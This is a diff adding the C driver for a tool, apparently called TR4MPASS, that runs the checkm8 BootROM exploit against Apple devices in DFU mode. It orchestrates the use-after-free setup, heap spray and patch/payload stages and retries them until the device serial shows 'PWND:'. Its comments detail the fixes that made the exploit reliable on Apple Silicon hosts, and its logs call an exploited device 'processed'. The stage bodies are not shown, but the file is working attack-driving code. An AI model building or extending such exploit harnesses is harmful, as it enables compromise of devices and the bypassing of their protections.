@@ -1,0 +1,665 @@
+/* checkm8.c -- checkm8 DFU handler: init, deliver, verify, cleanup */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <libusb.h>
+
+#include "dfu/dfu_handler.h"
+#include "dfu/checkm8.h"
+#include "dfu/checkm8_internal.h"
+#include "dfu/dfu_proto.h"
+#include "device/chip_db.h"
+#include "device/usb_dfu.h"
+#include "util/log.h"
+
+#if defined(__APPLE__)
+#include "dfu/iokit_usb.h"
+#endif
+
+/* ------------------------------------------------------------------ */
+/* dfu_init                                                        */
+/* ------------------------------------------------------------------ */
+
+int dfu_init(dfu_ctx_t *ctx, device_info_t *dev)
+{
+    const chip_info_t *chip;
+
+    if (!ctx || !dev)
+        return -1;
+
+    memset(ctx, 0, sizeof(*ctx));
+    ctx->dev = dev;
+
+    chip = chip_db_lookup(dev->cpid);
+    if (!chip) {
+        log_error("dfu_init: unknown CPID 0x%04X", dev->cpid);
+        return -1;
+    }
+
+    if (!chip->checkm8_compatible) {
+        log_error("dfu_init: chip %s (0x%04X) is not compatible",
+                  chip->name, chip->cpid);
+        return -1;
+    }
+
+    if (!dev->usb) {
+        log_error("dfu_init: device has no USB handle (not in DFU mode?)");
+        return -1;
+    }
+
+    ctx->chip = chip;
+    ctx->phase = DFU_PHASE_INIT;
+    ctx->payload_buf = NULL;
+    ctx->payload_len = 0;
+
+    log_info("dfu_init: target %s (%s), CPID 0x%04X",
+             chip->name, chip->marketing, chip->cpid);
+
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* dfu_deliver                                                     */
+/* ------------------------------------------------------------------ */
+
+#if defined(__APPLE__)
+/*
+ * E19 (E17 diff): gaster's main loop separates its stages STRICTLY --
+ * after EVERY stage (reset_usb_handle = ResetDevice + ReEnumerate,
+ * then close_usb_handle) it reopens a fresh handle via wait_usb_handle
+ * (SetConfiguration(1) + async event source) and re-reads the serial
+ * in checkm8_check_usb_device.  The winning run showed RESET/SETUP/
+ * SPRAY/PATCH each on its own handle.  This helper mirrors that cycle
+ * between our stages.
+ */
+static int dfu_iokit_interstage_reset(dfu_ctx_t *ctx)
+{
+    (void)ctx;
+    log_info("dfu_deliver: inter-stage reset (gaster reset_usb_handle)");
+    iokit_usb_reset_device();
+    usleep(20000);
+    iokit_usb_reenumerate();
+    iokit_usb_deactivate();
+    usleep(250000); /* device re-enumerates; fresh handle next */
+    if (iokit_usb_activate() != 0) {
+        log_error("dfu_deliver: IOKit re-activate after inter-stage "
+                  "reset failed");
+        return -1;
+    }
+    return 0;
+}
+#endif
+
+int dfu_deliver(dfu_ctx_t *ctx)
+{
+    if (!ctx || !ctx->dev || !ctx->chip)
+        return -1;
+
+    log_info("dfu_deliver: starting checkm8 on %s", ctx->chip->name);
+
+#if defined(__APPLE__)
+    /*
+     * E19 (E17/E16 decisive fact): the winning gaster run executes ALL
+     * FOUR stages on the IOKit backend (make macos builds
+     * DeviceRequestTO/DeviceRequestAsyncTO everywhere -- the raw
+     * IOReturns 0xe000404f/0xe0004051 in the E17 trace prove it).  We
+     * previously ran stages 1-2 on libusb and only switched to IOKit
+     * for stages 3-4; stage-2 attempt 3 then went through the libusb
+     * cancel path (sent=0) instead of gaster's async submit +
+     * sleep_ms(0) + USBDeviceAbortPipeZero (device accepts 64 bytes
+     * BEFORE the STALL, "ASYNC_DONE ... sz=64 status=1").  Activate
+     * IOKit BEFORE stage 1 so every stage matches that transport.
+     */
+    {
+        iokit_usb_deactivate();
+        usb_dfu_close(ctx->dev->usb);
+        ctx->dev->usb = NULL;
+        if (iokit_usb_activate() != 0) {
+            log_error("dfu_deliver: IOKit activation failed");
+            goto error;
+        }
+        log_info("dfu_deliver: IOKit active for ALL stages "
+                 "(gaster-exact transport, E19)");
+    }
+#endif
+
+    /* Stage 1: Reset DFU state (gaster cycle: DNLOAD16 -> 0 -> 3x
+     * GETSTATUS -> DNLOAD64) */
+    if (checkm8_stage_reset(ctx) != 0)
+        goto error;
+
+#if defined(__APPLE__)
+    /* E19: gaster resets after EVERY stage -- this one (reset->setup)
+     * was missing entirely.  Stage 1 ends with a 64-byte DNLOAD loaded
+     * into the device; setup must start from a fresh re-enumerated
+     * handle exactly like gaster's loop. */
+    if (iokit_usb_is_active()) {
+        if (dfu_iokit_interstage_reset(ctx) != 0)
+            goto error;
+    }
+#endif
+
+    /* Stage 2: Setup UAF (async DNLOAD + abort; IOKit timing on macOS) */
+    if (checkm8_stage_setup(ctx) != 0)
+        goto error;
+
+#if defined(__APPLE__)
+    /*
+     * E19: inter-stage reset (setup->spray) -- gaster does it; we
+     * previously only reset between spray and patch.
+     *
+     * Do NOT send CLR_STATUS / DFU_ABORT as part of this transition
+     * (matching gaster).  After stage 2 the device sits in
+     * dfuDNLOAD-IDLE with the pending io_request we intend to hijack.
+     * DFU-class commands from dfuIDLE corrupt the EP0 ring on Apple
+     * Silicon XHCI (kIOReturnNotReady -> device re-enumerates -> the
+     * IOKit IOService dies -> kIOReturnNoDevice for every later
+     * transfer).  The spray's stall/leak/no_leak requests walk the DFU
+     * state machine forward naturally; the final CLR_STATUS inside the
+     * spray (skip_clrstatus=0) is what brings it back to dfuIDLE.
+     */
+    if (iokit_usb_is_active()) {
+        if (dfu_iokit_interstage_reset(ctx) != 0)
+            goto error;
+        ctx->skip_clrstatus = 0;
+
+        /* E13: allow skipping the stage-3 CLR_STATUS (the sync wedge +
+         * re-enumeration it triggers on M-series is the last device-
+         * visible event before the overwrite; ipwndfu never sends it
+         * on the A9 path).  Run with TR4MPASS_SKIP_CLRSTATUS=1. */
+        if (getenv("TR4MPASS_SKIP_CLRSTATUS")) {
+            ctx->skip_clrstatus = 1;
+            log_info("dfu_deliver: TR4MPASS_SKIP_CLRSTATUS set -- "
+                     "stage-3 CLR_STATUS will be skipped (E13)");
+        }
+    }
+#endif
+
+    /* Stage 3: Heap Spray (uses IOKit on macOS, libusb elsewhere) */
+    if (checkm8_stage_spray(ctx) != 0) {
+        goto error;
+    }
+
+#if defined(__APPLE__)
+    /* E18/E19: gaster separates spray and patch with reset_usb_handle
+     * + close + reopen (E17 trace: descriptor + serial read between
+     * the SPRAY and PATCH sections). */
+    if (iokit_usb_is_active()) {
+        if (dfu_iokit_interstage_reset(ctx) != 0)
+            goto error;
+    }
+#endif
+
+    /* Stage 4: Patch & Payload (IOKit, gaster-exact with inter-stage reset) */
+    if (checkm8_stage_patch(ctx) != 0) {
+        goto error;
+    }
+
+#if defined(__APPLE__)
+    /*
+     * E19: gaster's loop resets after the LAST stage too (gaster.c
+     * L1347 reset_usb_handle runs unconditionally after every stage,
+     * before close_usb_handle L1352).  That ResetDevice +
+     * USBDeviceReEnumerate fires the hijacked dfu_handle_bus_reset
+     * callback -- i.e. it EXECUTES the payload.  Without it the device
+     * sits in DFU waiting for a bus reset that never comes.
+     * checkm8_verify then re-reads the re-enumerated serial
+     * (gaster: wait_usb_handle + checkm8_check_usb_device -> PWND).
+     */
+    if (iokit_usb_is_active()) {
+        iokit_usb_reset_device();
+        usleep(20000);
+        iokit_usb_reenumerate();
+    }
+    iokit_usb_deactivate();
+#endif
+
+    log_info("dfu_deliver: all stages complete");
+    return 0;
+
+error:
+#if defined(__APPLE__)
+    iokit_usb_deactivate();
+    /*
+     * Leave the device in a clean DFU entry.
+     *
+     * A stage-4 bail-out (EP0 permanently halted after the overwrite
+     * STALL) or a wedged DFU state machine would otherwise poison the
+     * NEXT run: the device still enumerates, so detection succeeds, but
+     * every stage-1 GET_STATUS times out.  A port-level reset forces a
+     * fresh re-enumeration while we still hold the device.
+     */
+    if (ctx->dev) {
+        if (ctx->dev->usb) {
+            usb_dfu_close(ctx->dev->usb);
+            ctx->dev->usb = NULL;
+        }
+        iokit_usb_recover_bus();
+    }
+#endif
+    return -1;
+}
+
+/* ------------------------------------------------------------------ */
+/* dfu_cleanup                                                     */
+/* ------------------------------------------------------------------ */
+
+void dfu_cleanup(dfu_ctx_t *ctx)
+{
+    if (!ctx)
+        return;
+
+    if (ctx->payload_buf) {
+        free(ctx->payload_buf);
+        ctx->payload_buf = NULL;
+    }
+
+    ctx->payload_len = 0;
+    ctx->phase = DFU_PHASE_INIT;
+    ctx->dev = NULL;
+    ctx->chip = NULL;
+}
+
+/* ------------------------------------------------------------------ */
+/* checkm8_verify                                                */
+/* ------------------------------------------------------------------ */
+
+int checkm8_verify(device_info_t *dev)
+{
+    char serial[DFU_SERIAL_MAX];
+    uint32_t cpid = 0;
+    uint64_t ecid = 0;
+
+    if (!dev)
+        return -1;
+#if !defined(__APPLE__)
+    /* Linux: verification needs the libusb handle. */
+    if (!dev->usb)
+        return -1;
+#endif
+    /* E19 (macOS): with the gaster-exact flow libusb is closed for the
+     * whole run (dev->usb == NULL) and the IOKit path below owns
+     * verification. */
+
+    memset(serial, 0, sizeof(serial));
+
+#if defined(__APPLE__)
+    /*
+     * macOS: read the live serial descriptor via IOKit ONLY IF
+     * libusb handle is NOT open.  If dev->usb is currently open,
+     * calling iokit_usb_activate() causes kIOReturnExclusiveAccess (0xe00002c5)
+     * and disrupts the active libusb control pipe!
+     */
+    if (!dev->usb) {
+        char iokit_serial[512] = {0};
+        int need_deactivate = 0;
+
+        if (!iokit_usb_is_active()) {
+            if (iokit_usb_activate() == 0)
+                need_deactivate = 1;
+        }
+
+        if (iokit_usb_is_active()) {
+            int slen = iokit_usb_read_serial(dev->iserial_index,
+                                             iokit_serial,
+                                             sizeof(iokit_serial));
+            if (slen > 0) {
+                log_debug("checkm8_verify: IOKit serial = \"%s\"",
+                          iokit_serial);
+                if (strstr(iokit_serial, "PWND:")) {
+                    log_info("checkm8_verify: device processed "
+                             "successfully (IOKit)");
+                    if (need_deactivate)
+                        iokit_usb_deactivate();
+                    return 1;
+                }
+            } else {
+                log_debug("checkm8_verify: IOKit serial read failed "
+                          "(ret=%d)", slen);
+            }
+        }
+
+        if (need_deactivate)
+            iokit_usb_deactivate();
+
+        /*
+         * E19: with no libusb handle on macOS, the IOKit serial read
+         * above IS the answer -- no PWND means the stages must run.
+         * Returning here avoids the libusb fallback below, which can
+         * only fail (dev->usb == NULL) and log a misleading usbipd
+         * warning on every fresh run.
+         */
+        return 0;
+    }
+#else
+    /*
+     * Linux: lsusb queries the live device descriptor from the kernel
+     * driver. libusb caches the serial from before the exploit.
+     */
+    {
+        FILE *fp2 = popen("lsusb -v -d 05ac:1227 2>/dev/null | grep iSerial", "r");
+        if (fp2) {
+            char ibuf[256] = {0};
+            while (fgets(ibuf, sizeof(ibuf)-1, fp2)) {
+                size_t n = strlen(ibuf);
+                if (n > 0 && ibuf[n-1] == '\n') ibuf[n-1] = '\0';
+                log_debug("checkm8_verify: lsusb iSerial: %s", ibuf);
+            }
+            pclose(fp2);
+        }
+
+        FILE *fp = popen("lsusb -v -d 05ac:1227 2>/dev/null | grep -c 'PWND:'", "r");
+        if (fp) {
+            int count = 0;
+            if (fscanf(fp, "%d", &count) == 1 && count > 0) {
+                pclose(fp);
+                log_info("checkm8_verify: device processed successfully (lsusb)");
+                return 1;
+            }
+            pclose(fp);
+        }
+    }
+#endif
+
+    /* Fall back to libusb (clears the stale cache by re-reading). */
+    if (usb_dfu_read_info(dev->usb, dev->iserial_index,
+                          &cpid, &ecid, serial, sizeof(serial)) != 0) {
+        /*
+         * libusb serial reads fail on usbipd-win even when the device is in
+         * processed DFU.  lsusb above already checked.  If the read fails
+         * entirely (device disconnected), treat as "not yet done"
+         * so the caller can wait for the device to reboot and retry.
+         */
+        log_warn("checkm8_verify: could not read USB serial (usbipd quirk)");
+        return 0;
+    }
+
+    log_debug("checkm8_verify: serial = \"%s\"", serial);
+
+    if (strstr(serial, "PWND:") != NULL) {
+        log_info("checkm8_verify: device processed successfully");
+        return 1;
+    }
+
+    log_warn("checkm8_verify: completion marker not found in serial");
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* usbipd_force_reattach (WSL only)                                    */
+/* ------------------------------------------------------------------ */
+
+/*
+ * Force usbipd to detach and immediately reattach the Apple DFU device.
+ * This clears stale kernel URBs and claimed interfaces that remain when
+ * a previous libusb process was killed without releasing the handle —
+ * a common occurrence on usbipd-win where the vhci_hcd virtual bus
+ * does not auto-clear on process death the way native usbfs does.
+ *
+ * No-op on non-WSL Linux and on any system where powershell.exe is
+ * not available in PATH.
+ */
+static void usbipd_force_reattach(void)
+{
+    if (!getenv("WSL_DISTRO_NAME"))
+        return;
+
+    log_info("checkm8: forcing usbipd reattach to clear stale USB state...");
+    /*
+     * Run entirely on the Windows side via powershell.exe.
+     * Errors are silenced — if usbipd isn't installed or the device
+     * isn't bound, the subsequent usb_dfu_find will fail gracefully.
+     */
+    system("powershell.exe -NoProfile -NonInteractive -Command "
+           "'try { usbipd detach --hardware-id 05ac:1227 2>$null } catch {}; "
+           "Start-Sleep -Milliseconds 1500; "
+           "try { usbipd attach --hardware-id 05ac:1227 --wsl 2>$null } catch {}' "
+           ">/dev/null 2>&1");
+    sleep(2); /* wait for vhci_hcd to re-enumerate the virtual device */
+}
+
+/* ------------------------------------------------------------------ */
+/* checkm8 -- top-level entry point                                    */
+/* ------------------------------------------------------------------ */
+
+int checkm8_run(device_info_t *dev)
+{
+    int attempt;
+
+    if (!dev) {
+        log_error("checkm8_run: NULL device");
+        return -1;
+    }
+
+    log_info("checkm8_run: starting process on CPID 0x%04X", dev->cpid);
+
+    /*
+     * Fast path: if the device is already in processed DFU mode (from a
+     * previous successful attempt), skip re-processing.
+     * checkm8_verify returns 1 if "PWND:" is in the serial.
+     *
+     * The probe itself must not disturb a device that still needs the
+     * stages: the stages are only valid against a fresh DFU (E19), and
+     * stage 1 expects EP0 exactly as the device left it.
+     *
+     * Linux: verify on the open handle -- lsusb reads the kernel's
+     * descriptor cache and the libusb serial read is harmless there, so
+     * the handle stays usable for the stages.
+     *
+     * macOS: reading the serial on the libusb handle is what returned
+     * kIOReturnTimeout on Apple Silicon XHCI and poisoned stage 1's
+     * GET_STATUS.  Close the handle FIRST instead: closing sends no USB
+     * traffic, so EP0 cannot be poisoned, and with dev->usb == NULL
+     * checkm8_verify takes its IOKit path (serial read on the IOService,
+     * no control requests).  E19 proved that read works on a pwned
+     * device without wedging anything
+     * (RESEARCH-apple-silicon-usb-c-dfu.md, E19).
+     */
+    {
+        int pre = 0;
+
+#if !defined(__APPLE__)
+        if (dev->usb)
+            pre = checkm8_verify(dev);
+#else
+        if (dev->usb) {
+            usb_dfu_close(dev->usb);
+            dev->usb = NULL;
+            pre = checkm8_verify(dev);
+        }
+#endif
+        if (pre == 1) {
+            log_info("checkm8_run: device already processed, skipping");
+            return 0;
+        }
+    }
+
+#if defined(__APPLE__)
+    /*
+     * The pre-check above closed the libusb handle so IOKit could own
+     * the device.  A device that is not processed still needs the
+     * stages, so re-open the handle the same way detection did.
+     */
+    if (!dev->usb) {
+        uint8_t reopen_iserial = 0;
+        int ra;
+
+        for (ra = 0; ra < 5 && !dev->usb; ra++) {
+            if (usb_dfu_find(&dev->usb, &reopen_iserial) == 0)
+                dev->iserial_index = reopen_iserial;
+            else if (ra < 4)
+                sleep(2);
+        }
+        if (!dev->usb) {
+            log_error("checkm8_run: DFU device lost after pre-check");
+            return -1;
+        }
+    }
+#endif
+
+#if defined(__APPLE__)
+    /*
+     * Pre-flight liveness check.
+     *
+     * A previous run that bailed out mid-stage-4 can leave EP0 halted on
+     * the BootROM side: the device still enumerates (detection succeeds)
+     * but every GET_STATUS times out, so stage 1 would burn an attempt
+     * pointlessly.  Probe once with a harmless GET_STATUS; if it fails,
+     * force a port-level reset so the device re-enters DFU cleanly.
+     */
+    if (dev->usb) {
+        dfu_status_t probe;
+        if (dfu_get_status(dev->usb, &probe) != 0) {
+            log_warn("checkm8_run: device unresponsive (stale EP0 from a "
+                     "previous run) -- forcing USB reset");
+            usb_dfu_close(dev->usb);
+            dev->usb = NULL;
+            iokit_usb_recover_bus();
+            sleep(2);
+            {
+                uint8_t probe_iserial = 0;
+                int pa;
+                for (pa = 0; pa < 5 && !dev->usb; pa++) {
+                    if (usb_dfu_find(&dev->usb, &probe_iserial) == 0)
+                        dev->iserial_index = probe_iserial;
+                    else if (pa < 4)
+                        sleep(2);
+                }
+            }
+            if (!dev->usb) {
+                log_error("checkm8_run: DFU device lost during recovery");
+                return -1;
+            }
+            log_info("checkm8_run: device recovered after USB reset");
+        }
+    }
+#endif
+
+    for (attempt = 1; attempt <= MAX_DFU_TRIES; attempt++) {
+        dfu_ctx_t ctx;
+        int result;
+
+        /* On retries, the device USB-resets after a failed attempt.
+         * Close the stale handle and re-enumerate before trying again. */
+        if (attempt > 1) {
+            if (dev->usb) {
+                usb_dfu_close(dev->usb);
+                dev->usb = NULL;
+            }
+            log_info("checkm8_run: waiting for device reset...");
+            usleep(USB_RECONNECT_DELAY_USEC);
+
+            /* Force usbipd reattach to clear stale kernel URBs / claimed
+             * interfaces from the previous attempt.  No-op on native Linux. */
+            usbipd_force_reattach();
+
+            {
+                uint8_t new_iserial = 0;
+                int find_attempt;
+                int found = 0;
+
+                /* Device may be mid-reboot; poll up to 4 times (every 3s). */
+                for (find_attempt = 0; find_attempt < 4; find_attempt++) {
+                    if (usb_dfu_find(&dev->usb, &new_iserial) == 0) {
+                        found = 1;
+                        break;
+                    }
+                    if (find_attempt < 3) {
+                        log_info("checkm8_run: DFU device not yet ready, waiting 3s...");
+                        sleep(3);
+                        usbipd_force_reattach();
+                    }
+                }
+                if (!found) {
+                    log_error("checkm8_run: DFU device lost after attempt %d, cannot retry",
+                              attempt - 1);
+                    return -1;
+                }
+                /* Re-enumerating can hand back a different iSerial
+                 * index if the device was hot-swapped for a different
+                 * chip family; refresh the cached value. */
+                dev->iserial_index = new_iserial;
+            }
+            log_info("checkm8_run: USB handle re-acquired for retry %d", attempt);
+
+            /*
+             * The previous attempt may have completed successfully, which
+             * reboots the device into processed DFU.  Check for completion
+             * before re-running -- sending DFU ABORT to a processed device
+             * would crash its modified USB stack.
+             */
+            {
+                int pre_pwned = checkm8_verify(dev);
+                if (pre_pwned == 1) {
+                    log_info("checkm8_run: device already processed after "
+                             "attempt %d, skipping re-run", attempt - 1);
+                    return 0;
+                }
+            }
+        }
+
+        log_info("checkm8_run: attempt %d/%d", attempt, MAX_DFU_TRIES);
+
+        if (dfu_init(&ctx, dev) != 0) {
+            log_warn("checkm8_run: init failed on attempt %d", attempt);
+            dfu_cleanup(&ctx);
+            continue;
+        }
+
+        if (dfu_deliver(&ctx) != 0) {
+            log_warn("checkm8_run: attempt %d failed, retrying...", attempt);
+            dfu_cleanup(&ctx);
+            continue;
+        }
+
+        /*
+         * After stage 4, libusb_reset_device was sent inside checkm8_stage_patch.
+         * The device either:
+         *   a) Stayed in DFU with completion marker (success)
+         *   b) Rebooted out of DFU (not in MANIFEST-WAIT-RESET)
+         *
+         * Close the now-stale handle, wait for the device to re-enumerate,
+         * then check for completion.  On usbipd we may also need a
+         * force_reattach if the device rebooted and usbipd lost tracking.
+         */
+        if (dev->usb) {
+            usb_dfu_close(dev->usb);
+            dev->usb = NULL;
+        }
+        sleep(5); /* give device time to re-enumerate or reboot */
+        usbipd_force_reattach();
+        sleep(2); /* extra settle after reattach */
+        {
+            uint8_t new_iserial = 0;
+            int fa;
+            for (fa = 0; fa < 4; fa++) {
+                if (usb_dfu_find(&dev->usb, &new_iserial) == 0)
+                    break;
+                if (fa < 3) {
+                    sleep(3);
+                    usbipd_force_reattach();
+                }
+            }
+            if (dev->usb)
+                dev->iserial_index = new_iserial;
+        }
+
+        result = dev->usb ? checkm8_verify(dev) : 0;
+        dfu_cleanup(&ctx);
+
+        if (result == 1) {
+            log_info("checkm8_run: success on attempt %d", attempt);
+            return 0;
+        }
+
+        if (result < 0)
+            log_error("checkm8_run: verification error on attempt %d", attempt);
+        else
+            log_warn("checkm8_run: not completed after attempt %d", attempt);
+    }
+
+    log_error("checkm8_run: failed after %d attempts", MAX_DFU_TRIES);
+    return -1;
+}
